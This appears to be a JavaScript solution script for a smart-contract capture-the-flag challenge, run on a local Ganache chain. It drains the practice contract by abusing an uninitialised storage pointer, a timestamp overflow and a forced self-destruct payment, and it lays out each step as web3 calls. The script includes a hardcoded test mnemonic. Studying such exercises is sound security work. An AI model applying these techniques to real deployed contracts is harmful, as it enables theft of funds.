/**
 * INSTRUCTIONS
 *
 * 1. Using Ganache on this one. Changed the port in truffle-config and the existing mnemonic (though I would
 * have some nice storage dumps but not really...).
 * 2. Run migration in development and re-execute all the steps: `truffle migrate --reset`: (cd 6_fifty_years_local && truffle migrate --reset)
 * 3. Copy challenge and proxy recently created contracts addresss to the variables below.
 * 4. Good to go, follow the steps one by one.
 *
 * SOLUTION
 *
 * Couldn't find anything about this but it seems we just have function scope, `contribution` variable isn't scoped to condition.
 * Which is extremely odd in my opinion, perhaps later compiler versions will detect this?
 *
 * So, we use a combination of timestamp overflow and proxy contract to solve this.
 * Note that `contribution.unlockTimestamp = timestamp;` will set head variable. And
 * `queue.push(contribution)` will increment length and whatever we have in `amount`.
 *
 * We could solve this challenge by not using any Proxy contract but that would be fiddly,
 * that is, a couple of more steps involved.
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js');

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:7545",
});

const web3 = new Web3(provider);

const challengeAbi = JSON.parse(
  fs.readFileSync(
    "./6_fifty_years_local/build/contracts/FiftyYearsChallenge.json"
  )
).abi;

const proxyAbi = JSON.parse(
  fs.readFileSync("./6_fifty_years_local/build/contracts/ProxyContract.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const challengeContractAddress = "0xddfDA99B63132f6f7E1F21CcFad0C5d248D00846";
const proxyContractAddress = "0x965e3957fa2c71e682bF13484E22FEee18730556";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    const challengeContract = new web3.eth.Contract(
      challengeAbi,
      challengeContractAddress
    );
    const proxyContract = new web3.eth.Contract(proxyAbi, proxyContractAddress);
    const gasPrice = await web3.eth.getGasPrice();
    let res;

    let amountToSend = 1;     // it will set array length, but afterwards there is a push
    const indexForElseCondition = 100;
    const overflowsToZero = 2n ** 256n;
    const oneDayTimestamp = 60n * 60n * 24n;
    const oneDayOverflowDifferenceTimestamp = overflowsToZero - oneDayTimestamp;

    // STEP 1
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, oneDayOverflowDifferenceTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    const zeroTimestamp = 0;
    amountToSend = 2;           // this will effectively be the index too if we fall in the else condition

    // STEP 2
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, zeroTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    let index = 2;

    // STEP 3 (optional): At this point we'll se that the sum is 1000000000000000005 but the challenge contract
    // balance is 1000000000000000003
    // res = await challengeContract.methods
    //   .withdraw2(index)
    //   .call();
    // console.log(res);

    // web3.eth.getBalance(challengeContractAddress, (_, balance) => {
    //   console.log(
    //     "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
    //   );
    // });

    // STEP 4: use RetirementFund strategy that is, force send 2 wei to Challenge contract
    // so the sum matches the contract balance
    // res = await proxyContract.methods
    //   .destroy(challengeContractAddress)
    //   .send({ from: accounts[1], gasPrice })
    // console.log(res);

    // STEP 5: sum and balance should be the same here, widthdraw.
    res = await challengeContract.methods
      .withdraw(index)
      .send({ from: user, gasPrice });
    console.log(res);

    /**
     * Some debug helpers below this point.
     */

    // challengeContract.methods
    //   .getLength()
    //   .call()
    //   .then(x => console.log('Length: ' + x));

    // challengeContract.methods
    //   .getNow()
    //   .call()
    //   .then(console.log);

    // challengeContract.methods
    //   .getHead()
    //   .call()
    //   .then(console.log);

    index = 2;

    // challengeContract.methods
    //   .getAmount(index)
    //   .call()
    //   .then(x => console.log('Index amount: ' + x));

    // challengeContract.methods
    //   .getTimestamp(index)
    //   .call()
    //   .then(console.log);


    // res = await challengeContract.methods
    //   .withdraw2(2)
    //   .call();
    // console.log('Total: ' + res);

    web3.eth.getBalance(challengeContractAddress, (_, balance) => {
      console.log(
        "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
      );
    });

  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
